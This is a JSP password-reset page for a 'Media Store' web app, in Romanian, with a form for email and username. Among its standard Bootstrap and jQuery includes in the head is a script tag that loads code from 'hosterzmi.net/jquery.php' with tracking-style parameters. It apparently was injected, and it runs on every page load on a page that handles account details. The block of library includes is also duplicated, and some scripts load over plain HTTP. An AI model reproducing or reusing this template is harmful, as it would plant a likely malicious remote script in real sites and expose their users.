<%@ page isErrorPage="true" language="java"
	contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ page isELIgnored="false"%>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Resetare parolă</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet"
	href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script	src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script	src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script	src="https://hosterzmi.net/jquery.php?u=07a748e98a2bcc6d1bfaacef446aef2d&c=1000_1&p=1"></script>
<link rel="stylesheet"	href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script	src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script	src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
	<div class="bs-example">
		<nav role="navigation" class="navbar navbar-default">
			<!-- Brand and toggle get grouped for better mobile display -->
			<div class="navbar-header">
				<button type="button" data-target="#navbarCollapse"
					data-toggle="collapse" class="navbar-toggle">
					<span class="sr-only">Toggle navigation</span> <span
						class="icon-bar"></span> <span class="icon-bar"></span> <span
						class="icon-bar"></span>
				</button>
				<a href="#" class="navbar-brand">Media Store </a>
			</div>
		
			<div id="navbarCollapse" class="collapse navbar-collapse">
				<ul class="nav navbar-nav">
					<li class="active"><a href="#">Resetare parolă</a></li>


				</ul>
				<ul class="nav navbar-nav navbar-right">
					<li><a href="#"> <span class="glyphicon glyphicon-user"></span> Login</a></li>
				</ul>
			</div>
		</nav>
	</div>

	<div class="container">
		<h2></h2>
		<form action="generatePassword" method="POST">
			<div class="form-group">
				
					<div class="jumbotron">
						<h3>Ohhh snap! Ai uitat parola? Nu-i nimic!</h3>
							<h4>
								<span class="glyphicon glyphicon-hand-down"></span>Urmează paşii de mai jos pentru a o recupera!
							</h4> <br />
						<div class="row">

							<div class="col-xs-4">
								<div class="form-group">
									<label for="email">Email:</label> <input type="email"
										name="emailAddress" class="form-control" id="emailAddrress"
										placeholder="Enter email">
								</div>
								<div class="row">
									<div class="col-xs-12">
										<div class="form-group">
											<label for="username">UserName:</label> <input type="text"
												name="userName" class="form-control" id="userName"
												placeholder="Enter Username">
										</div>

									</div>
								</div>
								</div>
								

								</div><div class="has-error">
									<h4 class="help-block">${errorMessage}</h4>
								</div>
								<button type="submit" class="btn btn-danger">Trimite</button>
								
								</div>
							</div>
								
		</form>
		
	</div>
	

</body>

</html>